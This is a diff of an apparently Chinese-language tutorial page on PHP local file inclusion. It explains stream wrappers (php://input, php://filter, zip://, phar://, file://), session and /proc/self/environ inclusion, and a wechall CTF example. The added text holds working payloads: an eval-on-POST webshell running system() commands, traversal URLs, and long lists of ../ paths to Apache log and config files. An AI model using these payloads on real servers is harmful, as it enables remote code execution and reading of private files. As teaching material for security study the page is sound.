@@ -207,16 +207,40 @@ PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPj
 
 
 <ul>
-<li><strong> php://input </strong> -- php的输入流，可以读到没有处理过的POST数据</li>
+<li><strong> php://input </strong> -- </li>
 </ul>
+<p>可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)</p>
 <blockquote>
 <p>php5.0以下 和 php5.2 版本有效, allow_url_include=On</p>
 </blockquote>
-<h1 id="firefox-hackbar">firefox hackbar</h1>
-<div class="hlcode"><pre><span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="nx">php</span><span class="o">:</span><span class="c1">//input</span>
+<p>LFI 导致 code excute</p>
+<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span> 
+<span class="err">　　</span><span class="k">@eval</span><span class="o">(</span><span class="nt">file_get_contents</span><span class="o">(</span><span class="s1">&#39;php://input&#39;</span><span class="o">))</span>
+<span class="o">?&gt;</span> 
+<span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="o">/</span><span class="nt">test</span><span class="o">/</span><span class="nt">index</span><span class="nc">.php</span>
+<span class="nt">post</span><span class="o">:</span> <span class="nt">system</span><span class="o">(</span><span class="s2">&quot;dir&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="nt">result</span><span class="o">:</span> <span class="nt">list</span> <span class="nt">directory</span>
+</pre></div>
 
-<span class="nx">post</span><span class="o">:</span>
-<span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="s1">&#39;ls&#39;</span><span class="p">);</span><span class="cp">?&gt;</span>
+
+<p>这本质上远程文件包含的利用，远程文件包含中的include接收的是一个"资源定位符"，在大多数情况下这是一个磁盘文件路径，但是从流的角度来看，这也可以是一个流资源定位符，即我们将include待包含的资源又重定向到了输入流中，从而可以输入我们的任意code到include中</p>
+<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
+<span class="err">　　</span><span class="k">@include</span><span class="o">(</span><span class="err">$</span><span class="nt">_GET</span><span class="cp">[</span><span class="s2">&quot;file&quot;</span><span class="cp">]</span><span class="o">)</span><span class="p">;</span>
+<span class="o">?&gt;</span>
+<span class="nt">http</span><span class="o">://</span><span class="nt">localhost</span><span class="o">/</span><span class="nt">test</span><span class="o">/</span><span class="nt">index</span><span class="nc">.php</span><span class="o">?</span><span class="nt">file</span><span class="o">=</span><span class="nt">php</span><span class="o">://</span><span class="nt">input</span>
+<span class="nt">post</span><span class="o">:</span> <span class="o">&lt;?</span><span class="nt">php</span> <span class="nt">system</span><span class="o">(</span><span class="s1">&#39;ipconfig&#39;</span><span class="o">);?&gt;</span>
+<span class="nt">result</span><span class="o">:</span> <span class="nt">ip</span> <span class="nt">information</span>
+</pre></div>
+
+
+<p>有一点要注意:</p>
+<div class="hlcode"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;solution.php&quot;</span><span class="p">);</span><span class="cp">?&gt;</span>
+</pre></div>
+
+
+<p>在利用文件包含进行代码执行的时候，我们通过file_get_contents获取到的文件内容，如果是一个.php文件，会被当作include的输入参数，也就意味着会被再执行一次，则我们无法看到原始代码了</p>
+<p>解决这个问题的方法就是使用base64_encode进行编码</p>
+<div class="hlcode"><pre><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">&quot;solution.php&quot;</span><span class="p">));</span><span class="cp">?&gt;</span>
 </pre></div>
 
 
@@ -237,6 +261,16 @@ PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPj
 </pre></div>
 
 
+<p>向磁盘写文件</p>
+<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
+<span class="err">　　</span><span class="c">/* 这会通过 rot13 过滤器筛选出字符 &quot;Hello World&quot;</span>
+<span class="c">　　然后写入当前目录下的 example.txt */</span>
+<span class="err">　　</span><span class="nt">file_put_contents</span><span class="o">(</span><span class="s2">&quot;php://filter/write=string.rot13/resource=example.txt&quot;</span><span class="o">,</span><span class="s2">&quot;Hello World&quot;</span><span class="o">);</span>
+<span class="o">?&gt;</span>
+</pre></div>
+
+
+<p>这个参数采用一个或以管道符 | 分隔的多个过滤器名称</p>
 <ul>
 <li><strong> php://fd </strong></li>
 </ul>
@@ -244,12 +278,105 @@ PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPj
 <p>php 5.3.6中新增加</p>
 </blockquote>
 <ul>
+<li>zip://</li>
+</ul>
+<div class="hlcode"><pre><span class="cp"># %23 --&gt; #, 截断</span>
+<span class="o">?</span><span class="n">f</span><span class="o">=</span><span class="n">zip</span><span class="o">:</span><span class="c1">//archive.zip%23dir/file.txt </span>
+</pre></div>
+
+
+<p>文件压缩成zip包，压缩的时候注意要选择only store之类的选项，防止数据被压缩</p>
+<div class="hlcode"><pre><span class="n">zip</span> <span class="o">-</span><span class="mi">0</span> <span class="mf">1.</span><span class="n">zip</span> <span class="n">shell</span><span class="p">.</span><span class="n">php</span>
+</pre></div>
+
+
+<ul>
+<li>phar://</li>
+</ul>
+<div class="hlcode"><pre><span class="o">?</span><span class="n">f</span><span class="o">=</span><span class="n">phar</span><span class="o">:</span><span class="c1">//php.zip/php.jpg</span>
+</pre></div>
+
+
+<p>与zip协议区别就是 phar 是用/来分隔而不是 #</p>
+<ul>
 <li><strong> glob </strong></li>
 </ul>
 <blockquote>
 <p>php&gt;5.3.0</p>
 </blockquote>
 <div class="hlcode"><pre><span class="n">DirectoryIterator</span><span class="p">(</span><span class="err">“</span><span class="n">glob</span><span class="o">:</span><span class="c1">//ext/spl/examples/*.php”)</span>
+</pre></div>
+
+
+<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
+<span class="err">　　</span><span class="o">//</span> <span class="err">循环</span> <span class="nt">ext</span><span class="o">/</span><span class="nt">spl</span><span class="o">/</span><span class="nt">examples</span><span class="o">/</span> <span class="err">目录里所有</span> <span class="o">*</span><span class="nc">.php</span> <span class="err">文件</span>
+<span class="err">　　</span><span class="o">//</span> <span class="err">并打印文件名和文件尺寸</span>
+<span class="err">　　$</span><span class="nt">it</span> <span class="o">=</span> <span class="nt">new</span> <span class="nt">DirectoryIterator</span><span class="o">(</span><span class="s2">&quot;glob://E:\\wamp\\www\\test\\*.php&quot;</span><span class="o">);</span>
+<span class="err">　　</span><span class="nt">foreach</span><span class="o">(</span><span class="err">$</span><span class="nt">it</span> <span class="nt">as</span> <span class="err">$</span><span class="nt">f</span><span class="o">)</span> 
+<span class="err">　　</span><span class="p">{</span>
+<span class="err">　　　　</span><span class="n">printf</span><span class="p">(</span><span class="s2">&quot;%s: %.1FK\n&quot;</span><span class="o">,</span> <span class="err">$</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">getFilename</span><span class="p">()</span><span class="o">,</span> <span class="err">$</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">getSize</span><span class="p">()</span><span class="o">/</span><span class="m">1024</span><span class="p">);</span>
+<span class="err">　　</span><span class="p">}</span>
+<span class="o">?&gt;</span>
+</pre></div>
+
+
+<ul>
+<li>file://</li>
+</ul>
+<p>越权访问本地文件</p>
+<p>file:// — 访问本地文件系统; 文件系统是PHP使用的默认封装协议，展现了本地文件系统</p>
+<div class="hlcode"><pre><span class="o">&lt;?</span><span class="nt">php</span>
+<span class="err">　　$</span><span class="nt">res</span> <span class="o">=</span> <span class="nt">file_get_contents</span><span class="o">(</span><span class="s2">&quot;file://E://wamp//www//test//solution.php&quot;</span><span class="o">);</span>
+<span class="err">　　</span><span class="nt">var_dump</span><span class="o">(</span><span class="err">$</span><span class="nt">res</span><span class="o">);</span>
+<span class="o">?&gt;</span>
+</pre></div>
+
+
+<p>file://这个伪协议可以展示"本地文件系统"，当存在某个用户可控制、并得以访问执行的输入点时，我们可以尝试输入file://去试图获取本地磁盘文件</p>
+<p>http://www.wechall.net/challenge/crappyshare/index.php</p>
+<p>http://www.wechall.net/challenge/crappyshare/crappyshare.php</p>
+<p>在这题CTF中，攻击的关键点在于：curl_exec($ch)</p>
+<div class="hlcode"><pre><span class="kd">function</span> <span class="nx">upload_please_by_url</span><span class="p">(</span><span class="nx">$url</span><span class="p">)</span>
+<span class="p">{</span> 
+<span class="err">　　</span><span class="k">if</span> <span class="p">(</span><span class="mi">1</span> <span class="o">===</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;#^</span><span class="cp">[</span><span class="nx">a</span><span class="na">-z</span><span class="cp">]</span><span class="s1">{3,5}://#&#39;</span><span class="p">,</span> <span class="nx">$url</span><span class="p">))</span> <span class="err">#</span> <span class="nx">Is</span> <span class="nx">URL</span><span class="o">?</span> 
+<span class="err">　　</span><span class="p">{</span>
+<span class="err">　　　　</span><span class="nx">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">(</span><span class="nx">$url</span><span class="p">);</span>
+<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FOLLOWLOCATION</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="err">　　　　</span><span class="nx">curl_setopt</span><span class="p">(</span><span class="nx">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_FAILONERROR</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="err">　　　　</span><span class="k">if</span> <span class="p">(</span><span class="kc">false</span> <span class="o">===</span> <span class="p">(</span><span class="nx">$file_data</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nx">$ch</span><span class="p">)))</span>
+<span class="err">　　　　</span><span class="p">{</span>
+<span class="err">　　　　　　</span><span class="nx">htmlDisplayError</span><span class="p">(</span><span class="s1">&#39;cURL failed.&#39;</span><span class="p">);</span>
+<span class="err">　　　　</span><span class="p">}</span>
+<span class="err">　　　　</span><span class="k">else</span>
+<span class="err">　　　　</span><span class="p">{</span>
+<span class="err">　　　　　　</span><span class="c1">// Thanks</span>
+<span class="err">　　　　　　</span><span class="nx">upload_please_thx</span><span class="p">(</span><span class="nx">$file_data</span><span class="p">);</span>
+<span class="err">　　　　</span><span class="p">}</span>
+<span class="err">　　</span><span class="p">}</span>
+<span class="err">　　</span><span class="k">else</span>
+<span class="err">　　</span><span class="p">{</span>
+<span class="err">　　　　</span><span class="nx">htmlDisplayError</span><span class="p">(</span><span class="s1">&#39;Your URL looks errorneous.&#39;</span><span class="p">);</span>
+<span class="err">　　</span><span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+
+
+<p>当我们输入的file://参数被带入curl中执行时，原本的远程URL访问会被重定向到本地磁盘上，从而达到越权访问文件的目的</p>
+<h2 id="session">包含Session文件</h2>
+<p>包含Session文件的条件也较为苛刻，它需要攻击者能够"控制"部分Session文件的内容。</p>
+<div class="hlcode"><pre><span class="nt">x</span><span class="o">|</span><span class="nt">s</span><span class="nd">:19</span><span class="o">:</span><span class="s2">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>
+</pre></div>
+
+
+<p>PHP默认生成的Session文件往往存放在/tmp目录下</p>
+<div class="hlcode"><pre><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">sess_SESSIONID</span>
+</pre></div>
+
+
+<h2 id="procselfenviron">包含/proc/self/environ文件</h2>
+<p>包含/proc/self/environ是一种更通用的方法，因为它根本不需要猜测包包含文件的路径，同时用户也能控制它的内容</p>
+<div class="hlcode"><pre><span class="nl">http:</span><span class="c1">//192.168.159.128/index.php?file=../../../../../../../proc/self/environ</span>
 </pre></div>
 
 
@@ -282,50 +409,59 @@ PGZvcm0gYWN0aW9uPSI8Pz0kX1NFUlZFUlsnUkVRVUVTVF9VUkknXT8%2BIiBtZXRob2Q9IlBPU1QiPj
 
 <p>你会发现WEB服务器一直不会返回响应，直到我们客户端断开这次连接，这个邪恶的空格便写入了WEB日志！</p>
 <ul>
+<li>conf file paths targeted by LFI</li>
+</ul>
+<div class="hlcode"><pre><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">apache2</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">httpd</span><span class="p">.</span><span class="n">conf</span>
+</pre></div>
+
+
+<ul>
 <li>Popular log file paths targeted by LFI</li>
 </ul>
-<div class="hlcode"><pre><span class="mf">1.</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">2.</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span>
-<span class="mf">3.</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">4.</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error_log</span>
-<span class="mf">5.</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">lampp</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span>
-<span class="mf">6.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">log</span>
-<span class="mf">7.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">8.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">9.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span>
-<span class="mf">10.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">thttpd_log</span>
-<span class="mf">11.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error_log</span>
-<span class="mf">12.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">13.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">-</span><span class="n">ssl</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">14.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">error_log</span>
-<span class="mf">15.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">httpsd</span><span class="o">/</span><span class="n">ssl_log</span>
-<span class="mf">16.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">access_log</span>
-<span class="mf">17.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">18.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">19.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">apache</span><span class="err">\</span><span class="n">logs</span><span class="err">\</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">20.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">Apache</span> <span class="n">Group</span><span class="err">\</span><span class="n">Apache</span><span class="err">\</span><span class="n">logs</span><span class="err">\</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">21.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">program</span> <span class="n">files</span><span class="err">\</span><span class="n">wamp</span><span class="err">\</span><span class="n">apache2</span><span class="err">\</span><span class="n">logs</span>
-<span class="mf">22.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">wamp</span><span class="err">\</span><span class="n">logs</span>
-<span class="mf">23.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">xampp</span><span class="err">\</span><span class="n">apache</span><span class="err">\</span><span class="n">logs</span><span class="err">\</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">24.</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">lampp</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error_log</span>
-<span class="mf">25.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">logs</span>
-<span class="mf">26.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span>
-<span class="mf">27.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error_log</span>
-<span class="mf">28.</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error_log</span>
-<span class="mf">29.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span>
-<span class="mf">30.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">31.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">apache</span><span class="o">-</span><span class="n">ssl</span><span class="o">/</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">32.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">httpd</span><span class="o">/</span><span class="n">access_log</span>
-<span class="mf">33.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">httpsd</span><span class="o">/</span><span class="n">ssl</span><span class="p">.</span><span class="n">access_log</span>
-<span class="mf">34.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">thttpd_log</span>
-<span class="mf">35.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">log</span><span class="o">/</span><span class="n">error_log</span>
-<span class="mf">36.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">access_log</span>
-<span class="mf">37.</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">logs</span><span class="o">/</span><span class="n">error_log</span>
-<span class="mf">38.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">apache</span><span class="err">\</span><span class="n">logs</span><span class="err">\</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">39.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Program</span> <span class="n">Files</span><span class="err">\</span><span class="n">Apache</span> <span class="n">Group</span><span class="err">\</span><span class="n">Apache</span><span class="err">\</span><span class="n">logs</span><span class="err">\</span><span class="n">error</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">40.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">wamp</span><span class="err">\</span><span class="n">apache2</span><span class="err">\</span><span class="n">logs</span>
-<span class="mf">41.</span> <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">xampp</span><span class="err">\</span><span class="n">apache</span><span class="err">\</span><span class="n">logs</span><span class="err">\</span><span class="n">access</span><span class="p">.</span><span class="n">log</span>
-<span class="mf">42.</span> <span class="n">proc</span><span class="o">/</span><span class="n">self</span><span class="o">/</span><span class="n">environ</span>
+<div class="hlcode"><pre><span class="cp">../apache/logs/error.log</span>
+<span class="cp">../apache/logs/access.log</span>
+<span class="cp">../../apache/logs/error.log</span>
+<span class="cp">../../apache/logs/access.log</span>
+<span class="cp">../../../apache/logs/error.log</span>
+<span class="cp">../../../apache/logs/access.log</span>
+<span class="cp">../../../../../../../etc/httpd/logs/acces_log</span>
+<span class="cp">../../../../../../../etc/httpd/logs/acces.log</span>
+<span class="cp">../../../../../../../etc/httpd/logs/error_log</span>
+<span class="cp">../../../../../../../etc/httpd/logs/error.log</span>
+<span class="cp">../../../../../../../etc/httpd/logs/error_log</span>
+<span class="cp">../../../../../../../etc/httpd/logs/error.log</span>
+<span class="cp">../../../../../../../var/www/logs/access_log</span>
+<span class="cp">../../../../../../../var/www/logs/access.log</span>
+<span class="cp">../../../../../../../usr/local/apache/logs/access_ log</span>
+<span class="cp">../../../../../../../usr/local/apache/logs/access. log</span>
+<span class="cp">../../../../../../../var/log/apache/access_log</span>
+<span class="cp">../../../../../../../var/log/apache2/access_log</span>
+<span class="cp">../../../../../../../var/log/apache/access.log</span>
+<span class="cp">../../../../../../../var/log/apache2/access.log</span>
+<span class="cp">../../../../../../../var/log/access_log</span>
+<span class="cp">../../../../../../../var/log/access.log</span>
+<span class="cp">../../../../../../../var/www/logs/error_log</span>
+<span class="cp">../../../../../../../var/www/logs/error.log</span>
+<span class="cp">../../../../../../../usr/local/apache/logs/error_l og</span>
+<span class="cp">../../../../../../../usr/local/apache/logs/error.l og</span>
+<span class="cp">../../../../../../../var/log/apache/error_log</span>
+<span class="cp">../../../../../../../var/log/apache2/error_log</span>
+<span class="cp">../../../../../../../var/log/apache/error.log</span>
+<span class="cp">../../../../../../../var/log/apache2/error.log</span>
+<span class="cp">../../../../../../../var/log/error_log</span>
+<span class="cp">../../../../../../../var/log/error.log</span>
+
+<span class="m">19.</span> C:\apache\logs\access.log
+<span class="m">20.</span> C:\Program Files\Apache Group\Apache\logs\access.log
+<span class="m">21.</span> C:\program files\wamp\apache2\logs
+<span class="m">22.</span> C:\wamp\logs
+<span class="m">23.</span> C:\xampp\apache\logs\error.log
+
+<span class="m">38.</span> C:\apache\logs\error.log
+<span class="m">39.</span> C:\Program Files\Apache Group\Apache\logs\error.log
+<span class="m">40.</span> C:\wamp\apache2\logs
+<span class="m">41.</span> C:\xampp\apache\logs\access.log
 </pre></div>
 </div>
 
